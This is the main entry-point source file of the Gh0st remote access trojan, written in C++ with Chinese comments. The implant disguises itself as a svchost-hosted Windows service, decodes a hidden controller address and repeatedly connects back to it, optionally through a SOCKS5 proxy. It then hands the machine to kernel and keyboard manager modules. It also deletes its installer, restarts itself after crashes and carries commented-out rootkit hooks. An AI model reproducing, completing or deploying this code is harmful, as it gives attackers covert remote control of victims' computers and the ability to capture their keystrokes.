// svchost.cpp : Defines the entry point for the console application.
//

#pragma comment(linker, "/OPT:NOWIN98")
#include "ClientSocket.h"
#include "common/KernelManager.h"
#include "common/KeyboardManager.h"
#include "common/login.h"
#include "common/install.h"
#include "common/until.h"
//#include "common/resetssdt.h"
//#include "common/hidelibrary.h"
enum
{
	NOT_CONNECT, //  還沒有連接
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};

#define		HEART_BEAT_TIME		1000 * 60 * 3 // 心跳時間

extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[]);
//extern "C" __declspec(dllexport) bool ResetSSDT();

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress );
void __stdcall ServiceHandler(DWORD dwControl);
#ifdef _CONSOLE
int main(int argc, char **argv);
#else
DWORD WINAPI main(char *lpServiceName);
#endif
SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;
DWORD	g_dwServiceType;
char	svcname[MAX_PATH];
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	// 發生異常，重新創建進程
	HANDLE	hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}
// 一定要足夠長
#ifdef _CONSOLE
#include <stdio.h>
int main(int argc, char **argv)
#else
DWORD WINAPI main(char *lpServiceName)
#endif
{
#ifdef _CONSOLE
	if (argc < 3)
	{
		printf("Usage:\n %s <Host> <Port>\n", argv[0]);
		return -1;
	}
#endif
	// lpServiceName,在ServiceMain返回後就沒有了
	char	strServiceName[256];
	char	strKillEvent[50];
	HANDLE	hInstallMutex = NULL;
#ifdef _DLL
	char	*lpURL = (char *)FindConfigString(CKeyboardManager::g_hInstance, "AAAAAA");
	if (lpURL == NULL)
	{
		return -1;
	}

	//////////////////////////////////////////////////////////////////////////
	// Set Window Station
	HWINSTA hOldStation = GetProcessWindowStation();
	HWINSTA hWinSta = OpenWindowStation("winsta0", FALSE, MAXIMUM_ALLOWED);
	if (hWinSta != NULL)
		SetProcessWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////
	

	if (CKeyboardManager::g_hInstance != NULL)
	{
		SetUnhandledExceptionFilter(bad_exception);
		//ResetSSDT();
		
		lstrcpy(strServiceName, lpServiceName);
		wsprintf(strKillEvent, "Global\\Gh0st %d", GetTickCount()); // 隨機事件名

		hInstallMutex = CreateMutex(NULL, true, lpURL);
		ReConfigService(strServiceName);
		// 刪除安裝文件
		DeleteInstallFile(lpServiceName);
	}
	// http://hi.baidu.com/zxhouse/blog/item/dc651c90fc7a398fa977a484.html
#endif
	// 告訴操作系統:如果沒有找到CD/floppy disc,不要彈窗口嚇人
	SetErrorMode( SEM_FAILCRITICALERRORS);
	char	*lpszHost = NULL;
	DWORD	dwPort = 80;
	char	*lpszProxyHost = NULL;
	DWORD	dwProxyPort = 0;
	char	*lpszProxyUser = NULL;
	char	*lpszProxyPass = NULL;

	HANDLE	hEvent = NULL;

	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT; // 斷開連接的原因,初始化為還沒有連接
	while (1)
	{
		// 如果不是心跳超時，不用再sleep兩分鐘
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2分鐘斷線重連, 為了盡快響應killevent
			for (int i = 0; i < 2000; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
					break;
					
				}
				// 改一下
				Sleep(60);
			}
		}
#ifdef _DLL
		// 上線間隔為2分, 前6個'A'是標誌
		if (!getLoginInfo(MyDecode(lpURL + 6), &lpszHost, &dwPort, &lpszProxyHost, 
				&dwProxyPort, &lpszProxyUser, &lpszProxyPass))
		{
			bBreakError = GETLOGINFO_ERROR;
			continue;
		}
#else
		lpszHost = argv[1];
		dwPort = atoi(argv[2]);
#endif
		if (lpszProxyHost != NULL)
			socketClient.setGlobalProxyOption(PROXY_SOCKS_VER5, lpszProxyHost, dwProxyPort, lpszProxyUser, lpszProxyPass);
		else
			socketClient.setGlobalProxyOption();

		DWORD dwTickCount = GetTickCount();
 		if (!socketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = CONNECT_ERROR;
			continue;
		}
		// 登錄
		DWORD dwExitCode = SOCKET_ERROR;
		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
		socketClient.setManagerCallBack(&manager);

		//////////////////////////////////////////////////////////////////////////
		// 等待控制端發送激活命令，超時為10秒，重新連接,以防連接錯誤
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}
		// 10秒後還沒有收到控制端發來的激活命令，說明對方不是控制端，重新連接
		if (!manager.IsActived())
			continue;

		//////////////////////////////////////////////////////////////////////////

		DWORD	dwIOCPEvent;
		dwTickCount = GetTickCount();

		do
		{
			hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
			dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
			Sleep(500);
		} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);

		if (hEvent != NULL)
		{
			socketClient.Disconnect();
			CloseHandle(hEvent);
			break;
		}
	}
#ifdef _DLL
	//////////////////////////////////////////////////////////////////////////
	// Restor WindowStation and Desktop	
	// 不需要恢復卓面，因為如果是更新服務端的話，新服務端先運行，此進程恢復掉了卓面，會產生黑屏
	// 	SetProcessWindowStation(hOldStation);
	// 	CloseWindowStation(hWinSta);
	//
	//////////////////////////////////////////////////////////////////////////
#endif

	SetErrorMode(0);
	ReleaseMutex(hInstallMutex);
	CloseHandle(hInstallMutex);
}

BOOL APIENTRY DllMain( HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:	
	case DLL_THREAD_ATTACH:
		CKeyboardManager::g_hInstance = (HINSTANCE)hModule;
		CKeyboardManager::m_dwLastMsgTime = GetTickCount();
		CKeyboardManager::Initialization();
		break;
	case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}
/*
extern "C" __declspec(dllexport) bool ResetSSDT()
{
	return RestoreSSDT(CKeyboardManager::g_hInstance);
}
*/
extern "C" __declspec(dllexport) void ServiceMain( int argc, wchar_t* argv[] )
{
	strncpy(svcname, (char*)argv[0], sizeof svcname); //it's should be unicode, but if it's ansi we do it well
    wcstombs(svcname, argv[0], sizeof svcname);
    hServiceStatus = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)ServiceHandler);
    if( hServiceStatus == NULL )
    {
        return;
    }else FreeConsole();
	
    TellSCM( SERVICE_START_PENDING, 0, 1 );
    TellSCM( SERVICE_RUNNING, 0, 0);
    // call Real Service function noew

	g_dwServiceType = QueryServiceTypeFromRegedit(svcname);
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
     do{
         Sleep(100);//not quit until receive stop command, otherwise the service will stop
     }while(g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	
	if (g_dwServiceType == 0x120)
	{
		//Shared的服務 ServiceMain 不退出，不然一些系統上svchost進程也會退出
		while (1) Sleep(10000);
	}
    return;
}

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
    SERVICE_STATUS srvStatus;
    srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    srvStatus.dwCurrentState = g_dwCurrState = dwState;
    srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    srvStatus.dwWin32ExitCode = dwExitCode;
    srvStatus.dwServiceSpecificExitCode = 0;
    srvStatus.dwCheckPoint = dwProgress;
    srvStatus.dwWaitHint = 1000;
    return SetServiceStatus( hServiceStatus, &srvStatus );
}

void __stdcall ServiceHandler(DWORD    dwControl)
{
    // not really necessary because the service stops quickly
    switch( dwControl )
    {
    case SERVICE_CONTROL_STOP:
        TellSCM( SERVICE_STOP_PENDING, 0, 1 );
        Sleep(10);
        TellSCM( SERVICE_STOPPED, 0, 0 );
        break;
    case SERVICE_CONTROL_PAUSE:
        TellSCM( SERVICE_PAUSE_PENDING, 0, 1 );
        TellSCM( SERVICE_PAUSED, 0, 0 );
        break;
    case SERVICE_CONTROL_CONTINUE:
        TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 );
        TellSCM( SERVICE_RUNNING, 0, 0 );
        break;
    case SERVICE_CONTROL_INTERROGATE:
        TellSCM( g_dwCurrState, 0, 0 );
        break;
    }
}
